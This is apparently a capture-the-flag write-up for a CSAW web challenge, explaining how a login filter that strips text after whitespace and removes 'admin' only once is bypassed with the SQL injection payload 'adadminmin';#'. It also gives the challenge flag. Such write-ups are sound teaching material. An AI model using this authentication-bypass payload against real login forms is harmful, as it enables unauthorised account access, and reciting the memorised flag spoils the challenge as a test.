---
description: Filtered SQL injection
---

# no pass needed

## Description

It's all about who you know and I know 'admin'.

http://web.chal.csaw.io:5001

## Solution

* The username is reflected back into the username field \(its `value` attribute\) after failed authentication
* By fuzzing username inputs, we can find that anything after a whitespace is removed.
* Furthermore, 'admin' is replaced **non-recursively**.

We can exploit an SQL injection in the username parameter. The payload is:

```text
username=adadminmin';#&password=
```

This will translate to the query:

```text
SELECT * FROM users WHERE username='admin';#
```

The flag is `flag{wh0_n3ed5_a_p4ssw0rd_anyw4y}`.

